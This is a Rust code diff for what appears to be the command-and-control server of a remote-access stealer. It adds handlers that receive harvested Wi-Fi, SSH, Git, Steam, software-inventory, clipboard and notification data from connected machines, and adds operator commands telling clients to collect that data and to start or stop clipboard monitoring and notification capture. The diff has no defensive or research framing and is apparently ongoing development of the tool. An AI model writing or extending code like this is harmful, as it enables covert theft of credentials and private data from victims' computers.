@@ -1017,8 +1017,130 @@ impl ServerWrapper {
                     .await;
                 }
 
+                WifiData(addr, data) => {
+                    self.emit_serde_payload(
+                        "wifi_data",
+                        serde_json::json!({
+                            "addr": addr.to_string(),
+                            "data": data,
+                        }),
+                    )
+                    .await;
+                }
+
+                SoftwareInventory(addr, data) => {
+                    self.emit_serde_payload(
+                        "software_inventory",
+                        serde_json::json!({
+                            "addr": addr.to_string(),
+                            "data": data,
+                        }),
+                    )
+                    .await;
+                }
+
+                GitData(addr, data) => {
+                    self.emit_serde_payload(
+                        "git_data",
+                        serde_json::json!({
+                            "addr": addr.to_string(),
+                            "data": data,
+                        }),
+                    )
+                    .await;
+                }
+
+                SSHData(addr, data) => {
+                    self.emit_serde_payload(
+                        "ssh_data",
+                        serde_json::json!({
+                            "addr": addr.to_string(),
+                            "data": data,
+                        }),
+                    )
+                    .await;
+                }
+
+                SteamData(addr, data) => {
+                    self.emit_serde_payload(
+                        "steam_data",
+                        serde_json::json!({
+                            "addr": addr.to_string(),
+                            "data": data,
+                        }),
+                    )
+                    .await;
+                }
+
+                ClipboardUpdate(addr, data) => {
+                    self.emit_serde_payload(
+                        "clipboard_update",
+                        serde_json::json!({
+                            "addr": addr.to_string(),
+                            "data": data,
+                        }),
+                    )
+                    .await;
+                }
+
+                NotificationEvent(addr, data) => {
+                    self.emit_serde_payload(
+                        "notification_event",
+                        serde_json::json!({
+                            "addr": addr.to_string(),
+                            "data": data,
+                        }),
+                    )
+                    .await;
+                }
+
                 GetBrowserData(addr) => {
                     self.handle_command(&addr, ClientboundPacket::GetBrowserData)
+                        .await;
+                }
+
+                GetWifiData(addr) => {
+                    self.handle_command(&addr, ClientboundPacket::GetWifiData)
+                        .await;
+                }
+
+                GetSoftwareInventory(addr) => {
+                    self.handle_command(&addr, ClientboundPacket::GetSoftwareInventory)
+                        .await;
+                }
+
+                GetGitData(addr) => {
+                    self.handle_command(&addr, ClientboundPacket::GetGitData)
+                        .await;
+                }
+
+                GetSSHData(addr) => {
+                    self.handle_command(&addr, ClientboundPacket::GetSSHData)
+                        .await;
+                }
+
+                GetSteamData(addr) => {
+                    self.handle_command(&addr, ClientboundPacket::GetSteamData)
+                        .await;
+                }
+
+                StartClipboardMonitor(addr) => {
+                    self.handle_command(&addr, ClientboundPacket::StartClipboardMonitor)
+                        .await;
+                }
+
+                StopClipboardMonitor(addr) => {
+                    self.handle_command(&addr, ClientboundPacket::StopClipboardMonitor)
+                        .await;
+                }
+
+                StartNotificationCapture(addr) => {
+                    self.handle_command(&addr, ClientboundPacket::StartNotificationCapture)
+                        .await;
+                }
+
+                StopNotificationCapture(addr) => {
+                    self.handle_command(&addr, ClientboundPacket::StopNotificationCapture)
                         .await;
                 }
 
